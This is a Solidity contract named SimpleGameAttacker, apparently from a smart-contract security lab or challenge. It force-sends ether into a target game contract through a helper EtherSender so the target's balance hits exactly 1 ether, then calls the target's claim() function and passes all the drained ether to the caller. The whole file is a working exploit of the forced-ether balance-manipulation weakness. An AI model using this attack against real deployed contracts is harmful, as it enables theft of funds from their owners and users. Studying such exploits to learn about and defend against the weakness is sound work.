// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {EtherSender} from "./EtherSender.sol";

contract SimpleGameAttacker {
    function attack(address game) public payable {
        uint256 currentGameBalance = address(game).balance;
        EtherSender etherSender = new EtherSender();
        // force send ether to the game contract
        etherSender.forceSendEther{value: 1 ether - currentGameBalance}(
            payable(game)
        );
        // now the balance is 1 ether, so we can claim
        (bool success, ) = game.call(abi.encodeWithSignature("claim()"));
        require(success, "Claim failed");
        // send all ether to the caller
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
